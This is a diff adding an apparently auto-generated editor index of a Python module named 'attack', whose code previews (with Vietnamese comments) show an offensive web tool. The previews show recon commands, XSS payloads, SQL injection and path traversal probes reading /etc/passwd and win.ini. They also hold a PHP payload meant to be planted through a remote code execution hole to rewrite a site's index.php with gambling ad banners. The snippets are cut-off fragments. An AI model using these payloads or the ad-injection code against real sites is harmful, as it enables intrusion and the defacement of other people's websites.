@@ -1,0 +1,214 @@
+[
+    {
+        "label": "subprocess",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "subprocess",
+        "description": "subprocess",
+        "detail": "subprocess",
+        "documentation": {}
+    },
+    {
+        "label": "Fore",
+        "importPath": "colorama",
+        "description": "colorama",
+        "isExtraImport": true,
+        "detail": "colorama",
+        "documentation": {}
+    },
+    {
+        "label": "Style",
+        "importPath": "colorama",
+        "description": "colorama",
+        "isExtraImport": true,
+        "detail": "colorama",
+        "documentation": {}
+    },
+    {
+        "label": "Fore",
+        "importPath": "colorama",
+        "description": "colorama",
+        "isExtraImport": true,
+        "detail": "colorama",
+        "documentation": {}
+    },
+    {
+        "label": "Style",
+        "importPath": "colorama",
+        "description": "colorama",
+        "isExtraImport": true,
+        "detail": "colorama",
+        "documentation": {}
+    },
+    {
+        "label": "os",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "os",
+        "description": "os",
+        "detail": "os",
+        "documentation": {}
+    },
+    {
+        "label": "requests",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "requests",
+        "description": "requests",
+        "detail": "requests",
+        "documentation": {}
+    },
+    {
+        "label": "argparse",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "argparse",
+        "description": "argparse",
+        "detail": "argparse",
+        "documentation": {}
+    },
+    {
+        "label": "urllib.parse",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "urllib.parse",
+        "description": "urllib.parse",
+        "detail": "urllib.parse",
+        "documentation": {}
+    },
+    {
+        "label": "time",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "time",
+        "description": "time",
+        "detail": "time",
+        "documentation": {}
+    },
+    {
+        "label": "base64",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "base64",
+        "description": "base64",
+        "detail": "base64",
+        "documentation": {}
+    },
+    {
+        "label": "re",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "re",
+        "description": "re",
+        "detail": "re",
+        "documentation": {}
+    },
+    {
+        "label": "execute_command",
+        "kind": 2,
+        "importPath": "attack",
+        "description": "attack",
+        "peekOfCode": "def execute_command(command):\n    exit_code = os.system(command)\n    if exit_code == 0:\n        print(Fore.GREEN + f\"Đã chạy xong : {command}\" + Style.RESET_ALL)\n    else:\n        print(\"Có lỗi xảy ra với mã thoát:\", exit_code)\n    # Chạy lệnh\ndef find_xss(url):\n    payload_xss_try =[\"<script>alert(1)</script>\",\"<img src=1 onerror=alert(1)>\"]\n    payload = \"\"\"abcxyz><\"'\"\"\"",
+        "detail": "attack",
+        "documentation": {}
+    },
+    {
+        "label": "find_xss",
+        "kind": 2,
+        "importPath": "attack",
+        "description": "attack",
+        "peekOfCode": "def find_xss(url):\n    payload_xss_try =[\"<script>alert(1)</script>\",\"<img src=1 onerror=alert(1)>\"]\n    payload = \"\"\"abcxyz><\"'\"\"\"\n    generate_payload_test_xss(url)\n    print(\"Đang tìm lỗ hổng XSS...\")\n    i= 0\n    for endpoint in endpoints:\n        check = False\n        check_vuln = False\n        # Gửi yêu cầu HTTP",
+        "detail": "attack",
+        "documentation": {}
+    },
+    {
+        "label": "find_sqli",
+        "kind": 2,
+        "importPath": "attack",
+        "description": "attack",
+        "peekOfCode": "def find_sqli(url):\n    generate_payload_test_SQL_injection(url)\n    print(\"Đang tìm lỗ hổng SQL injection...\")\n    i= 0\n    check_sql = False\n    for endpoint in endpoints:\n        check_sql = False\n        # Gửi yêu cầu HTTP\n        i = i +1\n        url_ = f\"{i} - URL : {endpoint}\"",
+        "detail": "attack",
+        "documentation": {}
+    },
+    {
+        "label": "find_file_inclusion",
+        "kind": 2,
+        "importPath": "attack",
+        "description": "attack",
+        "peekOfCode": "def find_file_inclusion(url):\n    generate_payload_test_File_inclusion(url)\n    check = False\n    endpoint_LFI = []\n    i= 0\n    for endpoint in endpoints:\n        # Gửi yêu cầu HTTP\n        i = i +1\n        url = f\"{i} - URL : {endpoint}\"\n        try:",
+        "detail": "attack",
+        "documentation": {}
+    },
+    {
+        "label": "inject_ads",
+        "kind": 2,
+        "importPath": "attack",
+        "description": "attack",
+        "peekOfCode": "def inject_ads(url):\n    print(\"Đang chèn quảng cáo qua lỗ hổng RCE...\")\n    php_code =\"\"\"<?php\n    $file_path = 'index.php';\n    $content = file_get_contents($file_path);\n    $new_content = str_replace('<body>', '<body> <div id=\"chilladv\" class=\"container\"> <div id=\"headerpcads\"><div class=\"hidemobile\"><center><a target=\"_blank\" rel=\"nofollow\" href=\"https://tinyurl.com/dabet-phimmoichill-topbanner\"><img class=\" ls-is-cached lazyloaded\" src=\"https://phimmoichilltv.net/newchill/vn88_pc.gif\" height=\"60px\" width=\"50%\" alt=\"\"></a><a target=\"_blank\" rel=\"nofollow\" href=\"https://6686vn.biz/dl30\"><img class=\" ls-is-cached lazyloaded\" src=\"https://phimmoichilltv.net/newchill/66_pc.gif\" height=\"60px\" width=\"50%\" alt=\"\"></a><br><a target=\"_blank\" rel=\"nofollow\" href=\"https://tinyurl.com/phimmoichill-vn88\"><img class=\" ls-is-cached lazyloaded\" src=\"https://phimmoichilltv.net/newchill/vn88_pc.gif\" height=\"60px\" width=\"728px\" alt=\"\"></a></center></div></div> <div id=\"headermbads\"><div class=\"hidedesktop\"><center><a target=\"_blank\" rel=\"nofollow\" href=\"https://tinyurl.com/dabet-phimmoichill-topbanner\"><img class=\" ls-is-cached lazyloaded\" src=\"https://phimmoichilltv.net/newchill/da_mb.gif\" height=\"40px\" width=\"320px\" alt=\"\"></a><br><a target=\"_blank\" rel=\"nofollow\" href=\"https://6686vn.biz/dl30\"><img class=\" ls-is-cached lazyloaded\" src=\"https://phimmoichilltv.net/newchill/66_mb.gif\" height=\"40px\" width=\"320px\" alt=\"\"></a><br><a target=\"_blank\" rel=\"nofollow\" href=\"https://tinyurl.com/phimmoichill-vn88\"><img class=\" ls-is-cached lazyloaded\" src=\"https://phimmoichilltv.net/newchill/vn88_mb.gif\" height=\"40px\" width=\"320px\" alt=\"\"></a></center></div> </div> </div>', $content);\n    file_put_contents($file_path, $new_content);\n    echo 'Success!';\n    ?>\n    \"\"\"",
+        "detail": "attack",
+        "documentation": {}
+    },
+    {
+        "label": "generate_payload_test_File_inclusion",
+        "kind": 2,
+        "importPath": "attack",
+        "description": "attack",
+        "peekOfCode": "def generate_payload_test_File_inclusion(url_web):\n    payload_file_inclusion = [\"../../../../etc/passwd\",\"/etc/passwd\",\"C:/Windows/win.ini\"]\n    host = get_host(url_web)\n    try:\n        with open(f'katana-{host}.txt', 'r') as file:\n            urls = file.readlines()\n    except Exception:\n         print(\"Hãy RECON trước khi khai thác !\")\n        # Xử lý từng URL\n    for url in urls:",
+        "detail": "attack",
+        "documentation": {}
+    },
+    {
+        "label": "recon_web",
+        "kind": 2,
+        "importPath": "attack",
+        "description": "attack",
+        "peekOfCode": "def recon_web(url):\n        host = get_host(url)\n        commands = [ f\"dirsearch -u {url} -i 200 -o dirsearch-{host}.txt \" , f\"katana -u {url} -o katana-{host}.txt\"]\n        print(Fore.GREEN + f\"------------- Đang Recon -----------\" + Style.RESET_ALL)\n        for command in commands: \n            execute_command(command)\ndef get_host(url):\n     return url.split(\"://\")[1].split(\"/\")[0]\ndef generate_payload_test_xss(url_web):\n    host = get_host(url_web)",
+        "detail": "attack",
+        "documentation": {}
+    },
+    {
+        "label": "get_host",
+        "kind": 2,
+        "importPath": "attack",
+        "description": "attack",
+        "peekOfCode": "def get_host(url):\n     return url.split(\"://\")[1].split(\"/\")[0]\ndef generate_payload_test_xss(url_web):\n    host = get_host(url_web)\n    try:\n        with open(f'katana-{host}.txt', 'r') as file:\n            urls = file.readlines()\n    except Exception:\n         print(\"Hãy RECON trước khi khai thác !\")\n    payload = \"\"\"abcxyz><\"'\"\"\"",
+        "detail": "attack",
+        "documentation": {}
+    },
+    {
+        "label": "generate_payload_test_xss",
+        "kind": 2,
+        "importPath": "attack",
+        "description": "attack",
+        "peekOfCode": "def generate_payload_test_xss(url_web):\n    host = get_host(url_web)\n    try:\n        with open(f'katana-{host}.txt', 'r') as file:\n            urls = file.readlines()\n    except Exception:\n         print(\"Hãy RECON trước khi khai thác !\")\n    payload = \"\"\"abcxyz><\"'\"\"\"\n        # Xử lý từng URL\n    for url in urls:",
+        "detail": "attack",
+        "documentation": {}
+    },
+    {
+        "label": "generate_payload_test_SQL_injection",
+        "kind": 2,
+        "importPath": "attack",
+        "description": "attack",
+        "peekOfCode": "def generate_payload_test_SQL_injection(url_web):\n    host = get_host(url_web)\n    try:\n        with open(f'katana-{host}.txt', 'r') as file:\n            urls = file.readlines()\n    except Exception:\n         print(\"Hãy RECON trước khi khai thác !\")\n    payload = \"\"\"abcxyz><\"'\"\"\"\n        # Xử lý từng URL\n    for url in urls:",
+        "detail": "attack",
+        "documentation": {}
+    },
+    {
+        "label": "lua_chon_chuc_nang",
+        "kind": 2,
+        "importPath": "attack",
+        "description": "attack",
+        "peekOfCode": "def lua_chon_chuc_nang(url):\n    print(Fore.RED +\"\"\"                      _____ \n     /\\              / ____|\n    /  \\     _ __   | |     \n   / /\\ \\   | '_ \\  | |     \n  / ____ \\  | | | | | |____ \n /_/    \\_\\ |_| |_|  \\_____|\n          \"\"\" + Style.RESET_ALL)\n    print(\"Chọn một trong các lựa chọn sau:\")\n    print(\"1/ Recon web\")",
+        "detail": "attack",
+        "documentation": {}
+    },
+    {
+        "label": "vulns",
+        "kind": 5,
+        "importPath": "attack",
+        "description": "attack",
+        "peekOfCode": "vulns = set()\ndef execute_command(command):\n    exit_code = os.system(command)\n    if exit_code == 0:\n        print(Fore.GREEN + f\"Đã chạy xong : {command}\" + Style.RESET_ALL)\n    else:\n        print(\"Có lỗi xảy ra với mã thoát:\", exit_code)\n    # Chạy lệnh\ndef find_xss(url):\n    payload_xss_try =[\"<script>alert(1)</script>\",\"<img src=1 onerror=alert(1)>\"]",
+        "detail": "attack",
+        "documentation": {}
+    }
+]
